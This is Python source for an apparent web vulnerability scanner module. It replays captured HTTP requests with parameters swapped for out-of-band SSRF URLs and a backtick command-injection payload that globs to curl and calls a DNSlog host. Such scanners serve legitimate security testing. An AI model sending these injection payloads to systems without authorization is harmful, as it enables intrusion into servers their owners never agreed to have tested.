# coding=utf-8
import json
from conf.ConfigFileModifyHandler import Config
import copy
import requests
import urllib3
import uuid
from urllib import parse

class HttpWappalyzer(object):
    def __init__(self):
        self.black_params_list = Config.get_instance().get("app.BLACK_PARAMS").split('|')
        self.black_headers = Config.get_instance().get("app.BLACK_HEADERS").split('|')
        self.use_proxy = Config.get_instance().get("app.PROXY")
        self.timeout = int(Config.get_instance().get("app.TIMEOUT"))
        self.proxy = {
            'http': Config.get_instance().get("app.PROXY_HTTP"),
            'https': Config.get_instance().get("app.PROXY_HTTP"),
        }
        self.redirect = True if Config.get_instance().get('app.REDIRECT') == 'true' else False
        self.ssrfpayload = Config.get_instance().get("app.SSRF_DNSLOG")
        self.tencent = True if Config.get_instance().get("app.SSRF_TENCENT") =='YES' else False
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        self.ssrf_list = []
        self.rce_list = []

    def parseUrl(self, url):
        """
        获取url，? 号之前的url
        :param url:
        :return:
        """
        return url.split('?')[0]

    def pop_black_headers(self, headers_dict):
        """
        去掉黑名单的headers
        :param headers_dict:
        :return:
        """
        keys = headers_dict.keys()
        for key in list(keys):
            if key.lower() in self.black_headers:
                headers_dict.pop(key)

        return headers_dict

    def generate_uuid(self):
        """
        生成唯一字符串
        :return:
        """
        return ''.join(str(uuid.uuid4()).split('-'))[0:10]

    def generate_ssrf_payload(self, s):
        """
        生成SSRF dnslog 域名
        :return:
        """
        poc = self.generate_uuid() + '.'+ s + '.' + self.ssrfpayload
        self.ssrf_list.append(poc)
        if self.tencent:
            return "http://tst.qq.com/ssrf_forward.php?host="+ poc

        return "http://" + poc

    def generate_rce_payload(self,s):
        poc = self.generate_uuid() + '.'+ s + '.'+ self.ssrfpayload
        self.rce_list.append(poc)
        return '`{/usr/bin/?url,'+ poc +'}`'

    def updateJsonObjectFromStr(self, base_obj, update_str: str, mode: int):
        """
        为数据中的value 添加 、替换为 update_str
        :param base_obj:
        :param update_str:
        :param mode: 0, 替换  1 追加  2 ssrf  3 rce
        :return: 返回带有update_str的字典
        """
        assert (type(base_obj) in (list, dict))
        base_obj = copy.deepcopy(base_obj)
        # 存储上一个value是str的对象，为的是更新当前值之前，将上一个值还原
        last_obj = None
        # 如果last_obj是dict，则为字符串，如果是list，则为int，为的是last_obj[last_key]执行合法
        last_key = None
        last_value = None
        # 存储当前层的对象，只有list或者dict类型的对象，才会被添加进来
        curr_list = [base_obj]
        # 只要当前层还存在dict或list类型的对象，就会一直循环下去
        while len(curr_list) > 0:
            # 用于临时存储当前层的子层的list和dict对象，用来替换下一轮的当前层
            tmp_list = []
            for obj in curr_list:
                # 对于字典的情况
                if type(obj) is dict:
                    for k, v in obj.items():
                        if k not in self.black_params_list:
                            # 如果不是list, dict, str类型，直接跳过  {"action":"xx","data":{"isPreview":false}}  这里不会替换isPreview, 他是bool类型
                            if type(v) not in (list, dict, str, int):
                                continue
                            # list, dict类型，直接存储，放到下一轮
                            if type(v) in (list, dict):
                                tmp_list.append(v)
                            # 字符串类型的处理
                            else:
                                # 如果上一个对象不是None的，先更新回上个对象的值
                                if last_obj is not None:
                                    last_obj[last_key] = last_value
                                # 重新绑定上一个对象的信息
                                last_obj = obj
                                last_key, last_value = k, v
                                # 执行更新
                                if mode == 0:
                                    obj[k] = update_str
                                elif mode == 1:
                                    obj[k] = str(v) + update_str
                                elif mode == 2:
                                    obj[k] = self.generate_ssrf_payload(update_str)
                                # 生成器的形式，返回整个字典
                                elif mode == 3:
                                    obj[k] = self.generate_rce_payload(update_str)
                                yield base_obj

                # 列表类型和字典差不多
                elif type(obj) is list:
                    list_flag = True
                    for i in range(len(obj)):
                        # 为了和字典的逻辑统一，也写成k，v的形式，下面就和字典的逻辑一样了，可以把下面的逻辑抽象成函数
                        k, v = i, obj[i]
                        if v not in self.black_params_list:
                            if type(v) not in (list, dict, str, int):
                                continue
                            if type(v) in (list, dict):
                                tmp_list.append(v)
                            elif list_flag:
                                if last_obj is not None:
                                    last_obj[last_key] = last_value
                                last_obj = obj
                                last_key, last_value = k, v
                                if mode == 0:
                                    obj[k] = update_str
                                elif mode == 1:
                                    obj[k] = str(v) + update_str
                                elif mode == 2:
                                    obj[k] = self.generate_ssrf_payload(update_str)
                                elif mode == 3:
                                    obj[k] = self.generate_rce_payload(update_str)
                                list_flag = False
                                yield base_obj
            curr_list = tmp_list

    def replaceHashTag(self,v):
        # 替换 # 为 %23
        if isinstance(v,str):
            return v.replace('#','%23')
        return v
        

    def assemble_parameter(self, d):
        #return '&'.join([k if v is None else '{0}={1}'.format(k, json.dumps(v, separators=(',', ':')) if isinstance(v, (dict,list)) else v) for k, v in d.items()])
        # 20221212发现 url中存在#号导致请求被截断，需要将#号进行url编码
        return '&'.join([k if v is None else '{0}={1}'.format(k, json.dumps(v, separators=(',', ':')).replace("#","%23") if isinstance(v, (dict,list)) else self.replaceHashTag(v)) for k, v in d.items()])


    def sendGetRequest(self, url, p, h, protocol):
        """
        发送get请求数据
        :param url:  url
        :param p: get参数
        :param h:  请求头
        :param protocol: http or https
        :return:
        """
        if self.use_proxy == 'YES':
            if protocol == 'https':
                return requests.get(url=self.parseUrl(url), params=self.assemble_parameter(p), headers=h, proxies=self.proxy, verify=False,
                             allow_redirects=self.redirect, timeout=self.timeout)
            else:
                return requests.get(url=self.parseUrl(url), params=self.assemble_parameter(p), headers=h, proxies=self.proxy,
                             allow_redirects=self.redirect, timeout=self.timeout)
        else:
            if protocol == 'https':
                return requests.get(url=self.parseUrl(url), params=self.assemble_parameter(p), headers=h, verify=False, allow_redirects=self.redirect, timeout=self.timeout)
            else:
                return requests.get(url=self.parseUrl(url), params=self.assemble_parameter(p), headers=h, allow_redirects=self.redirect, timeout=self.timeout)

    def sendPostRequest(self, url, p, d, h, protocol):
        """
        发送post请求
        :param url: url
        :param p: get参数
        :param d:  post data
        :param h:  请求头
        :param protocol: http or https
        :return:
        """
        if self.use_proxy == 'YES':
            if protocol == 'https':
                return requests.post(url=self.parseUrl(url), params=self.assemble_parameter(p), data=self.assemble_parameter(d), headers=h, proxies=self.proxy, verify=False,
                              allow_redirects=self.redirect, timeout=self.timeout)
            else:
                return requests.post(url=self.parseUrl(url), params=self.assemble_parameter(p), data=self.assemble_parameter(d), headers=h, proxies=self.proxy,
                              allow_redirects=self.redirect, timeout=self.timeout)
        else:
            if protocol == 'https':
                return requests.post(url=self.parseUrl(url), params=self.assemble_parameter(p), data=self.assemble_parameter(d), headers=h, verify=False,
                              allow_redirects=self.redirect, timeout=self.timeout)
            else:
                return requests.post(url=self.parseUrl(url), params=self.assemble_parameter(p), data=self.assemble_parameter(d), headers=h, allow_redirects=self.redirect, timeout=self.timeout)

    def sendPostJsonRequest(self, url, p, d, h, protocol):
        """
        发送 application/json 数据
        :param url:
        :param p:
        :param d:
        :param h:
        :param protocol:
        :return:
        """
        if self.use_proxy == 'YES':
            if protocol == 'https':
                return requests.post(url=self.parseUrl(url), params=self.assemble_parameter(p), data=json.dumps(d, separators=(',', ':'),ensure_ascii=False), headers=h, proxies=self.proxy,
                              verify=False, allow_redirects=self.redirect, timeout=self.timeout)
            else:
                return requests.post(url=self.parseUrl(url), params=self.assemble_parameter(p), data=json.dumps(d, separators=(',', ':'),ensure_ascii=False), headers=h, proxies=self.proxy,
                              allow_redirects=self.redirect, timeout=self.timeout)
        else:
            if protocol == 'https':
                return requests.post(url=self.parseUrl(url), params=self.assemble_parameter(p), data=json.dumps(d, separators=(',', ':'),ensure_ascii=False), headers=h, verify=False,
                              allow_redirects=self.redirect, timeout=self.timeout)
            else:
                return requests.post(url=self.parseUrl(url), params=self.assemble_parameter(p), data=json.dumps(d, separators=(',', ':'),ensure_ascii=False), headers=h,
                              allow_redirects=self.redirect, timeout=self.timeout)

    def processRequest(self, request_data):
        """
        重放http/s 数据
        :param request_data:
        :return:
        """
        h = self.pop_black_headers(request_data['headers'])
        protocol = request_data['protocol']
        method = request_data['method']
        content_type = request_data['content_type']
        url = request_data['full_url']
        param_in_url = request_data['param_in_url']
        param_in_body = request_data['param_in_body']
        body = request_data['body']
        if method == 'GET' and param_in_url:
            return self.sendGetRequest(url, param_in_url, h, protocol)
        elif method == 'POST' and content_type == 1:
            return self.sendPostRequest(url, param_in_url, param_in_body, h, protocol)
        elif method == 'POST' and content_type == 4:
            return self.sendPostJsonRequest(url, param_in_url, body, h, protocol)

    def generateResponse(self,resp: requests.Response):
        """
        生成http原始响应包
        :param resp:
        :return:
        """
        if resp:
            response_raw = "HTTP/1.1 {} {}\r\n".format(resp.status_code, resp.reason)
            for k, v in resp.headers.items():
                response_raw += "{}: {}\r\n".format(k, v)
            response_raw += "\r\n"
            response_raw += resp.content.decode('utf-8','ignore')
            return response_raw
        return "----BurpHack:Error Request\r\n\r\nBurpHack:Error Request----"

    def generateRequest(self, request_dict):
        """
        组装字典为http原始请求包
        :param request_dict:
        :return:
        """
        #print(self.assemble_parameter(request_dict['param_in_url']))
        #print(bool(self.assemble_parameter(request_dict['param_in_url'])))
        #print('?' + self.assemble_parameter(request_dict['param_in_url']) if self.assemble_parameter(
        #    request_dict['param_in_url']) else self.assemble_parameter(request_dict['param_in_url']))
        request_raw = '{} {}{} HTTP/1.1\r\n'.format(request_dict['method'], parse.urlparse(request_dict['full_url']).path, '?'+self.assemble_parameter(request_dict['param_in_url']) if self.assemble_parameter(request_dict['param_in_url']) else self.assemble_parameter(request_dict['param_in_url']) )
        for k, v in request_dict['headers'].items():
            request_raw += "{}: {}\r\n".format(k, v)
        request_raw +='\r\n'
        if request_dict['content_type'] == 4:
            request_raw += json.dumps(request_dict['body'], separators=(',', ':'), ensure_ascii=False)
        else:
            request_raw += self.assemble_parameter(request_dict['param_in_body'])
        return request_raw

    def generate_request_data_list(self, request_data, update_str, mode):
        """
        生成发送请求所需的字典
        :param request_data:
        :param update_str:
        :param mode:
        :return:
        """
        type = request_data['content_type']
        param_url_dict = request_data['param_in_url']
        param_body_dict = request_data['param_in_body']
        # json_body_dict = request_data['body']
        request_data_list = []
        copy_data = copy.deepcopy(request_data)
        if type == 4:
            for i in self.updateJsonObjectFromStr(param_url_dict, update_str, mode):
                request_data['param_in_url'] = i
                try:
                    request_data['body'] = json.loads(request_data['body'])
                except:
                    pass
                request_data_list.append(copy.deepcopy(request_data))

            for j in self.updateJsonObjectFromStr(json.loads(copy_data['body']), update_str,
                                                         mode):
                copy_data['body'] = j
                request_data_list.append(copy.deepcopy(copy_data))
            return request_data_list
        else:
            for i in self.updateJsonObjectFromStr(param_url_dict, update_str, mode):
                request_data['param_in_url'] = i
                # print(request_data)
                request_data_list.append(copy.deepcopy(request_data))

            for j in self.updateJsonObjectFromStr(param_body_dict, update_str, mode):
                copy_data['param_in_body'] = j
                request_data_list.append(copy.deepcopy(copy_data))
            return request_data_list

    def generate_request_for_first(self, request_data):
        """
        发送原始请求，没有经过修改的请求
        :param request_data:
        :return:
        """
        request_data_copy = copy.deepcopy(request_data)
        try:
            request_data_copy['body'] = json.loads(request_data_copy['body'])
        except:
            pass
        return self.generateRequest(request_data_copy), self.generateResponse(self.processRequest(request_data_copy))

# if __name__ == '__main__':
#     d = json.loads('{"headers": {"User-Agent": "Fiddler/5.0.20202.18177 (.NET 4.8; WinNT 10.0.17763.0; zh-CN; 8xAMD64; Emergency Check; Full Instance; Extensions: APITesting, AutoSaveExt, EventLog, FiddlerOrchestraAddon, HostsFile, RulesTab2, SAZClipboardFactory, SimpleFilter, Timeline)", "Referer": "http://fiddler2.com/client/TELE/5.0.20202.18177", "Connection": "close", "Host": "www.fiddler2.com", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN"}, "method": "GET", "full_url": "https://www.fiddler2.com:443/UpdateCheck.aspx?isBeta=False", "param_in_body": {}, "body": "{}", "protocol": "https", "content_type": 0, "port": 443, "host": "www.fiddler2.com", "param_in_url": {"isBeta": "http://bc3f804abb.ssrf.mabwcy.xforlog.cn"}}')
#     h = HttpWappalyzer()
#     print(h.generateRequest(d))



# if __name__ == '__main__':
#     http = HttpWappalyzer()
#     req = requests.get('https://www.baidu.com')
#     print(http.generateResponse(req))

# if __name__ == '__main__':
#     x =  {'set': {'service1':{"service2":123,"z":[9,10]}},'sorce_api_key': 'ce29a51aa5c94a318755b2529dcb8e0b','a': [1,'api_key',{"service6":[9,'service',{"xxx":123}]}],'api_key':123,'name':'xxxx'}
#     y = {'set': 444, 'sorce_api_key': 'ce29a51aa5c94a318755b2529dcb8e0b',
#          'a': [1,2,{"qt":"script"}], 'api_key': 123}
#
#     myJsonObj2 = {"name":"网站","num":3,"service0": [{"name1":"Google", "info":["Android", "Google 搜索", "Google 翻译" ] },{"name2":"Runoob", "info":["菜鸟教程", "菜鸟工具", "菜鸟微信" ] },{ "name3":"Taobao", "info":["淘宝", "网购" ] }]}
#     http = HttpWappalyzer()
#     for i in http.updateJsonObjectFromStr(y,22,0):
#         print(i)
#     x = {'set':'aaa','k':'zzzz'}
#     http = HttpWappalyzer()
#     http2 = HttpWappalyzer()
#     for i in http.updateJsonObjectFromStr(x, 'ssrf', 2):
#         print(i)
